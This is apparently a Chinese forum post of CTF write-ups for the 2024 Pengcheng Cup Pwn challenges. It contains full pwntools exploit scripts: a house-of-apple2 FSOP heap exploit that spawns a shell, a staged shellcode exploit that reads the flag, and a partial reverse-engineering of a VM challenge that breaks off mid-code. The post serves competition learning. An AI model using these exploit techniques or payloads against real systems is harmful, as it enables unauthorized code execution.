---
title: 2024鹏城杯Pwn方向超详细全部题解
url: https://forum.butian.net/share/3906
source: 奇安信攻防社区
date: 2024-11-14
fetch_date: 2025-10-06T19:12:59.254260
---

# 2024鹏城杯Pwn方向超详细全部题解

#

[问答](https://forum.butian.net/questions)

*发起*

* [提问](https://forum.butian.net/question/create)
* [文章](https://forum.butian.net/share/create)

[攻防](https://forum.butian.net/community)
[活动](https://forum.butian.net/movable)

Toggle navigation

* [首页 (current)](https://forum.butian.net)
* [问答](https://forum.butian.net/questions)
* [商城](https://forum.butian.net/shop)
* [实战攻防技术](https://forum.butian.net/community)
* [漏洞分析与复现](https://forum.butian.net/articles)
  NEW
* [活动](https://forum.butian.net/movable)
* [摸鱼办](https://forum.butian.net/questions/Play)

搜索

* [登录](https://forum.butian.net/login)
* [注册](https://user.skyeye.qianxin.com/user/register?next=http://forum.butian.net/btlogin)

### 2024鹏城杯Pwn方向超详细全部题解

本篇文章内容是2024鹏城杯Pwn方向的全部题解

babyheap
========
- 题目中dele没有uaf，但是发现edit函数的长度固定为0x400
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/11/attach-e85d0dcb25a040cb44fc04af15d8bb9e17f30566.png)
- libc2.35，所以要打IO,这里用house of apple2
- 利用add(0)泄露出heapbase，填满tcache利用unsorted bin泄露libcbase后，直接利用一次edit的漏洞来申请出\\_IO\\_2\\_1\\_stderr来布置IO链即可
```Python
from pwnlib.util.packing import u64
from pwnlib.util.packing import u32
from pwnlib.util.packing import u16
from pwnlib.util.packing import u8
from pwnlib.util.packing import p64
from pwnlib.util.packing import p32
from pwnlib.util.packing import p16
from pwnlib.util.packing import p8
from pwn import \*
from ctypes import \*
import ast
import struct
context(os='linux', arch='amd64', log\_level='debug')
# p = process("/home/zp9080/PWN/pwn")
# p=gdb.debug("/home/zp9080/PWN/pwn",'b \*$rebase(0x1A8F7)')
p=remote('192.168.18.22',8888)
# p=process(['seccomp-tools','dump','/home/zp9080/PWN/pwn'])
# elf = ELF("/home/zp9080/PWN/pwn")
libc=ELF("/home/zp9080/PWN/libc.so.6")
def dbg():
gdb.attach(p,'b \*$rebase(0x15E8)')
pause()
menu=b"inputs your choice:"
def add(idx,size,cont):
p.sendlineafter(menu,str(1))
p.sendlineafter("input idx:",str(idx))
p.sendlineafter("input size:",str(size))
p.sendafter("input content:",cont)
def delete(idx):
p.sendlineafter(menu,str(2))
p.sendlineafter("input idx:",str(idx))
def show(idx):
p.sendlineafter(menu,str(3))
p.sendlineafter("input idx:\n",str(idx))
def edit(idx,cont):
p.sendlineafter(menu,str(4))
p.sendlineafter("input idx:\n",str(idx))
p.send(cont)
#
#泄露heapbase
p.sendlineafter(menu,str(1))
p.sendlineafter("input idx:",str(0))
p.sendlineafter("input size:",str(0))
add(1,0x20,b'a')
delete(0)
# dbg()
p.sendlineafter(menu,str(1))
p.sendlineafter("input idx:",str(0))
p.sendlineafter("input size:",str(0))
show(0)
heapbase=u64(p.recv(5).ljust(8,b'\x00'))<<12
print(hex(heapbase))
#泄露libcbase
for i in range(8):
add(i,0xa0,b'a')
add(8,0x20,b'a')
for i in range(8):
delete(i)
# dbg()
for i in range(7):
add(i,0xa0,b'a')
add(7,0x60,b'\xe0')
show(7)
# dbg()
libcbase=u64(p.recvuntil('\x7f')[-6:].ljust(8, b'\x00'))-0x21ace0-0x100
print(hex(libcbase))
add(7,0x30,b'a')
add(0,0x20,b'a')
add(1,0x300,b'a')
add(2,0x300,b'a')
add(3,0x20,b'a')
delete(2)
delete(1)
IO\_2\_1\_stderr=libcbase+libc.sym['\_IO\_2\_1\_stderr\_']
# dbg()
edit(0,b'a'\*0x20+p64(0)+p64(0x301)+p64( ((heapbase+0x8c0)>>12)^ IO\_2\_1\_stderr) )
rdi=libcbase+0x000000000002a3e5
rsi=libcbase+0x000000000002be51
rdxr12=libcbase+0x11f2e7
ret=libcbase+0x29139
system\_addr=libcbase+libc.sym['system']
payload= b' sh;\x00\x00\x00'+p64(0)
payload += p64(0) + p64(system\_addr) + p64(1) + p64(2) #这样设置同时满足fsop
payload = payload.ljust(0x48, b'\x00') + p64(heapbase) #FAKE FILE+0x48
payload = payload.ljust(0xa0, b'\x00') + p64(heapbase+0x8d0) #\_wide\_data
payload = payload.ljust(0xd8, b'\x00') + p64(libcbase + libc.sym['\_IO\_wfile\_jumps']) #vtable=\_IO\_wfile\_jumps
wide\_data=b'\x00'
wide\_data=wide\_data.ljust(0x68,b'\x00')
wide\_data+=p64(system\_addr)
wide\_data=wide\_data.ljust(0xe0,b'\x00')
wide\_data+=p64(heapbase+0x8d0)
# dbg()
add(1,0x300,wide\_data)
add(2,0x300,payload)
p.sendlineafter(menu,str(1))
p.sendlineafter("input idx:",str(0))
p.sendlineafter("input size:",str(0x500))
p.interactive()
```
cool\\_book
==========
- 可以发现add的时候idx的限制不严格，导致越界，可以将返回地址覆盖为堆地址
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/11/attach-459533bac0c63527c51486e94e08b37cb82e21c3.png)
- 同时init函数让堆可读可写可执行，所以可以直接执行shellcode，但是read只有0x10字节，不好直接布置shellcode，所以这个shellcode调用read，然后再写入很长长度的shellcode即可
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/11/attach-fca38cfde2edb92c19090079be91032090aef7bb.png)
- exp
```Python
from pwnlib.util.packing import u64
from pwnlib.util.packing import u32
from pwnlib.util.packing import u16
from pwnlib.util.packing import u8
from pwnlib.util.packing import p64
from pwnlib.util.packing import p32
from pwnlib.util.packing import p16
from pwnlib.util.packing import p8
from pwn import \*
from ctypes import \*
import ast
import struct
context(os='linux', arch='amd64', log\_level='debug')
# p = process("/home/zp9080/PWN/pwn")
# p=gdb.debug("/home/zp9080/PWN/pwn",'b \*$rebase(0x1A8F7)')
p=remote('192.168.18.25',8888)
# p=process(['seccomp-tools','dump','/home/zp9080/PWN/pwn'])
elf = ELF("/home/zp9080/PWN/pwn")
libc=elf.libc
def dbg():
gdb.attach(p,'b \*$rebase(0x161D)')
pause()
# dbg()
#6605c255f81e4a68a946e87ea4e6b14f
p.sendlineafter("3.exit",str(1))
p.sendlineafter("input idx",str(0x31))
shellcode='''
xor edi,edi
mov rdx,0x1000
syscall
'''
p.sendafter("input content",asm(shellcode))
# dbg()
p.sendlineafter("3.exit",str(3))
shellcode=b'\x90'\*0x400+asm(shellcraft.open('flag',0)+shellcraft.read(3,'rsp',0x100)+shellcraft.write(1,'rsp',0x100))
p.send(shellcode)
p.interactive()
```
vm
==
题目分析
----
题目是常见的vm类型，\*\*这个函数的功能就是初始化mem,a\[0\]~a\[7\]是寄存器,a\[8\]是栈，a\[11\]是栈大小,a\[12\]在后面发现是rsp,a\[10\]在后面发现是rip\*\*
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/11/attach-ae1b52db1c14162e934c9305c54ef741ae96977f.png)
题目在到vmrun之前会有个check函数
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/11/attach-13947553fb6adf287cd9bca17217290df370bc2f.png)
看到中间有一部分很难逆向，但是发现了magic\\_number，\*\*看出这是md5\*\*
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/11/attach-d51e0aec2aef6deedd5e9e701491ae8b9cc110ae.png)
同时这个不是硬爆md5,\*\*可以看到与magic比较是用strcmp，同时md5这里会有\\x00截断\*\*，所以只用看截断之前的东西就可以了
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/11/attach-b4b7633fe6835dfd78f6aba907d4451da6973750.png)
最终的check这样通过
```python
check=b'LOGIN:root\nadmin:h3r3\_1s\_y0u2\_G1ft!&&An9q\nDONE&EXIT\n'
```
题目中还有个sandbox，只让使用open,read,brk,close这几个系统调用，所以得考虑\*\*侧信道\*\*来爆出flag
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/11/attach-a8ea79b604cc3071ec6819fab86322bee2013725.png)
vmcode逆向内容如下
```python
#reg[idx]/=value
def reg\_mulvalue(idx,value):
global pay
pay+=b'\xb8'+b'\x01'+p8(idx)+p64(value)
# reg[idx1]/=reg2[idx2]test
def div(idx1, idx2):
global pay
pay += b'\xb8' + b'\x00' + p8(idx1) + p8(idx2)
# stack[rsp]=value
def pushvalue(value):
global pay
pay += b'\xb4' + b'\x01' + p64(value)
#stack[rsp]=reg[idx]
def pushreg(idx):
global pay
pay+=b'\xb4'+b'\x00'+p8(idx)
#ret
def popreg(rip):
global pay
pay+=b'\xb2'+p8(rip)
#reg[idx]|=value
def reg\_orvalue(idx,value):
global pay
pay+=b'\xb0'+b'\x01'+p8(idx)+p64(value)
#reg[idx1]|=reg[idx2]
def reg\_orreg(idx1,idx2):
global pay
pay+=b'\xb0'+b'\x00'+p8(idx1)+p8(idx2)
def reg\_addvalue(idx,value):
global pay
pay+=b'\x61'+b'\x01'+p8(idx)+p64(value)
def reg\_addreg(idx1,idx2):
global pay
pay+=b'\x61'+b'\x00'+p8(idx1)+p8(idx2)
def reg\_subvalue(idx,value):
global pay
pay+=b'\x63'+b'\x01'+p8(idx)+p64(value)
def reg\_subreg(idx1,idx2):
global pay
pay+=b'\x63'+b'\x00'+p8(idx1)+p8(idx2)
def reg\_mulvalue(idx,value):
global pay
pay+=b'\x65'+b'\x01'+p8(idx)+p64(value)
def reg\_mulreg(idx1,idx2):
global pay
pay+=b'\x65'+b'\x00'+p8(idx1)+p8(idx2)
def reg\_xorvalue(idx,value):
global pay
pay+=b'\x67'+b'\x01'+p8(idx)+p64(value)
def reg\_xorreg(idx1,idx2):
global pay
pay+=b'\x67'+b'\x00'+p8(idx1)+p8(idx2)
def bitwise\_not(idx): #但是没有增加rip???
global pay
pay+=b'\x69'+p8(idx)
#free and malloc
def malloc(size):
global pay
pay+=b'\x14'+...